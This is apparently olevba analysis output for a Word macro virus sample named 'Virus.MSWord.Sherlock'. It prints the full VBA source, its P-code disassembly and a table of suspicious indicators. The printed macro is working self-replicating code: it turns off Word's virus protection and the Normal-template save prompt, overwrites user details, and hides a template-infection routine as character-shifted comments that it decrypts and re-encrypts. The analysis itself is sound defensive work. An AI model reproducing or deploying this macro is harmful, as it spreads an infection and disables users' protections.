olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Sherlock
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Sherlock - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const BOK = "Rio&Umi 4ever together"
'Unread
Private Sub document_open()
  Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
  Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
  Set Thi = ThisDocument.VBProject.VBComponents(1).CodeModule
  ADi = AD.Find(BOK, 1, 1, 100, 100)
  NTi = NT.Find(BOK, 1, 1, 100, 100)
 
  If (ADi = True And NTi = True) Then
    GoTo finish
  End If
  If Thi.lines(2, 1) = "'Unread" Then
    Call dekrip
  ElseIf Thi.lines(2, 1) = "'Read" Then
    GoTo finish
  End If
Application.Caption = "Rio&Umi 4ever together"


finish:
End Sub


Private Sub document_close()
On Error GoTo finish
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  Application.UserName = "Rio&Umi 4ever together"
  Application.UserAddress = "rio96@student.te.ugm.ac.id"
  Application.UserInitials = "Rio"
  Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
  Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
  Set Thi = ThisDocument.VBProject.VBComponents(1).CodeModule
  ADi = AD.Find(BOK, 1, 1, 100, 100)
  NTi = NT.Find(BOK, 1, 1, 100, 100)
  
  If (ADi = True And NTi = True) Then
    GoTo finish
  End If
  If Thi.lines(2, 1) = "'Read" Then
    Call enkrip
  ElseIf Thi.lines(2, 1) = "'Unread" Then
    GoTo finish
  End If
',,
',,Ur,4MPu,I,`~�q,Mzp,Z`u,I,Rmxq5,`tqz
',,,,_MbU`,I,Z{~ymx`qy|xm€q:_m‚qp
',,,,Z`:pqxq€qxuzq,=8,Z`:O{�z€{rxuzq
',,,,o{ppq,I,`tu:xuzq4=8,`tu:O{�z€{rxuzq5
',,,,Z`:mppr~{y€~uzs,o{ppq
',,,,^qy,Ur,m‚u€,`tqz,Z{~ymx`qy|xm€q:_m‚q
',,QxqUr,4MPu,I,Rmxq,Mzp,Z`u,I,`~�q5,`tqz
',,,,_MbU`,I,Mo€u‚qP{o�yqz€:_m‚qp
',,,,MP:pqxq€qxuzq,=8,MP:O{�z€{rxuzq
',,,,o{ppq,I,`tu:xuzq4=8,`tu:O{�z€{rxuzq5
',,,,,MP:mppr~{y€~uzs,o{ppq
',,,,Ur,_MbU`,`tqz,Mo€u‚qP{o�yqz€:_m‚q
',,Qzp,Ur
  
ActiveDocument.Save
finish:
ActiveDocument.Save

End Sub

Private Sub enkrip()
Dim test1 As String
   
    'JumLine = ThisDocument.VBProject.VBComponents(1).CodeModule.Countoflines
    For i = 46 To 59
        test1 = "'"
        Line = ThisDocument.VBProject.VBComponents(1).CodeModule.lines(i, 1)
        panbar = Len(Line)
        For t = 1 To panbar
            Kar = Mid$(Line, t, 1)
            test1 = test1 + (Chr(Asc(Kar) + 12))
        Next
    ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine i, test1
    test1 = "'"
    Next
    ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine 2, "'Unread"
End Sub

Private Sub dekrip()
Dim test1 As String
    
    'JumLine = ActiveDocument.VBProject.VBComponents(1).CodeModule.Countoflines
    For i = 46 To 59
        test1 = ""
        Line = ThisDocument.VBProject.VBComponents(1).CodeModule.lines(i, 1)
        panbar = Len(Line)
        For t = 2 To panbar
            Kar = Mid$(Line, t, 1)
            test1 = test1 + (Chr(Asc(Kar) - 12))
        Next
    ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine i, test1
    test1 = ""
    Next
    ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine 2, "'Read"
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Sherlock
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6113 bytes
' Line #0:
' 	Dim (Const) 
' 	LitStr 0x0016 "Rio&Umi 4ever together"
' 	VarDefn BOK
' Line #1:
' 	QuoteRem 0x0000 0x0006 "Unread"
' Line #2:
' 	FuncDefn (Private Sub document_open())
' Line #3:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #4:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Thi 
' Line #6:
' 	Ld BOK 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld AD 
' 	ArgsMemLd Find 0x0005 
' 	St ADi 
' Line #7:
' 	Ld BOK 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld NT 
' 	ArgsMemLd Find 0x0005 
' 	St NTi 
' Line #8:
' Line #9:
' 	Ld ADi 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NTi 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #10:
' 	GoTo finish 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Thi 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0007 "'Unread"
' 	Eq 
' 	IfBlock 
' Line #13:
' 	ArgsCall (Call) dekrip 0x0000 
' Line #14:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Thi 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0005 "'Read"
' 	Eq 
' 	ElseIfBlock 
' Line #15:
' 	GoTo finish 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	LitStr 0x0016 "Rio&Umi 4ever together"
' 	Ld Application 
' 	MemSt Caption 
' Line #18:
' Line #19:
' Line #20:
' 	Label finish 
' Line #21:
' 	EndSub 
' Line #22:
' Line #23:
' Line #24:
' 	FuncDefn (Private Sub document_close())
' Line #25:
' 	OnError finish 
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #28:
' 	LitStr 0x0016 "Rio&Umi 4ever together"
' 	Ld Application 
' 	MemSt UserName 
' Line #29:
' 	LitStr 0x001A "rio96@student.te.ugm.ac.id"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #30:
' 	LitStr 0x0003 "Rio"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #31:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #32:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #33:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Thi 
' Line #34:
' 	Ld BOK 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld AD 
' 	ArgsMemLd Find 0x0005 
' 	St ADi 
' Line #35:
' 	Ld BOK 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld NT 
' 	ArgsMemLd Find 0x0005 
' 	St NTi 
' Line #36:
' Line #37:
' 	Ld ADi 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NTi 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #38:
' 	GoTo finish 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Thi 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0005 "'Read"
' 	Eq 
' 	IfBlock 
' Line #41:
' 	ArgsCall (Call) enkrip 0x0000 
' Line #42:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Thi 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0007 "'Unread"
' 	Eq 
' 	ElseIfBlock 
' Line #43:
' 	GoTo finish 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	QuoteRem 0x0000 0x0002 ",,"
' Line #46:
' 	QuoteRem 0x0000 0x0026 ",,Ur,4MPu,I,`~�q,Mzp,Z`u,I,Rmxq5,`tqz"
' Line #47:
' 	QuoteRem 0x0000 0x0020 ",,,,_MbU`,I,Z{~ymx`qy|xm€q:_m‚qp"
' Line #48:
' 	QuoteRem 0x0000 0x0025 ",,,,Z`:pqxq€qxuzq,=8,Z`:O{�z€{rxuzq"
' Line #49:
' 	QuoteRem 0x0000 0x002A ",,,,o{ppq,I,`tu:xuzq4=8,`tu:O{�z€{rxuzq5"
' Line #50:
' 	QuoteRem 0x0000 0x001A ",,,,Z`:mppr~{y€~uzs,o{ppq"
' Line #51:
' 	QuoteRem 0x0000 0x0029 ",,,,^qy,Ur,m‚u€,`tqz,Z{~ymx`qy|xm€q:_m‚q"
' Line #52:
' 	QuoteRem 0x0000 0x002A ",,QxqUr,4MPu,I,Rmxq,Mzp,Z`u,I,`~�q5,`tqz"
' Line #53:
' 	QuoteRem 0x0000 0x0020 ",,,,_MbU`,I,Mo€u‚qP{o�yqz€:_m‚qp"
' Line #54:
' 	QuoteRem 0x0000 0x0025 ",,,,MP:pqxq€qxuzq,=8,MP:O{�z€{rxuzq"
' Line #55:
' 	QuoteRem 0x0000 0x002A ",,,,o{ppq,I,`tu:xuzq4=8,`tu:O{�z€{rxuzq5"
' Line #56:
' 	QuoteRem 0x0000 0x001B ",,,,,MP:mppr~{y€~uzs,o{ppq"
' Line #57:
' 	QuoteRem 0x0000 0x0025 ",,,,Ur,_MbU`,`tqz,Mo€u‚qP{o�yqz€:_m‚q"
' Line #58:
' 	QuoteRem 0x0000 0x0008 ",,Qzp,Ur"
' Line #59:
' Line #60:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #61:
' 	Label finish 
' Line #62:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #63:
' Line #64:
' 	EndSub 
' Line #65:
' Line #66:
' 	FuncDefn (Private Sub enkrip())
' Line #67:
' 	Dim 
' 	VarDefn test1 (As String)
' Line #68:
' Line #69:
' 	QuoteRem 0x0004 0x0048 "JumLine = ThisDocument.VBProject.VBComponents(1).CodeModule.Countoflines"
' Line #70:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x002E 
' 	LitDI2 0x003B 
' 	For 
' Line #71:
' 	LitStr 0x0001 "'"
' 	St test1 
' Line #72:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St Like 
' Line #73:
' 	Ld Like 
' 	FnLen 
' 	St panbar 
' Line #74:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld panbar 
' 	For 
' Line #75:
' 	Ld Like 
' 	Ld t 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St Kar 
' Line #76:
' 	Ld test1 
' 	Ld Kar 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x000C 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Add 
' 	St test1 
' Line #77:
' 	StartForVariable 
' 	Next 
' Line #78:
' 	Ld i 
' 	Ld test1 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #79:
' 	LitStr 0x0001 "'"
' 	St test1 
' Line #80:
' 	StartForVariable 
' 	Next 
' Line #81:
' 	LitDI2 0x0002 
' 	LitStr 0x0007 "'Unread"
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #82:
' 	EndSub 
' Line #83:
' Line #84:
' 	FuncDefn (Private Sub dekrip())
' Line #85:
' 	Dim 
' 	VarDefn test1 (As String)
' Line #86:
' Line #87:
' 	QuoteRem 0x0004 0x004A "JumLine = ActiveDocument.VBProject.VBComponents(1).CodeModule.Countoflines"
' Line #88:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x002E 
' 	LitDI2 0x003B 
' 	For 
' Line #89:
' 	LitStr 0x0000 ""
' 	St test1 
' Line #90:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St Like 
' Line #91:
' 	Ld Like 
' 	FnLen 
' 	St panbar 
' Line #92:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld panbar 
' 	For 
' Line #93:
' 	Ld Like 
' 	Ld t 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St Kar 
' Line #94:
' 	Ld test1 
' 	Ld Kar 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x000C 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Add 
' 	St test1 
' Line #95:
' 	StartForVariable 
' 	Next 
' Line #96:
' 	Ld i 
' 	Ld test1 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #97:
' 	LitStr 0x0000 ""
' 	St test1 
' Line #98:
' 	StartForVariable 
' 	Next 
' Line #99:
' 	LitDI2 0x0002 
' 	LitStr 0x0005 "'Read"
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #100:
' 	EndSub 
' Line #101:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

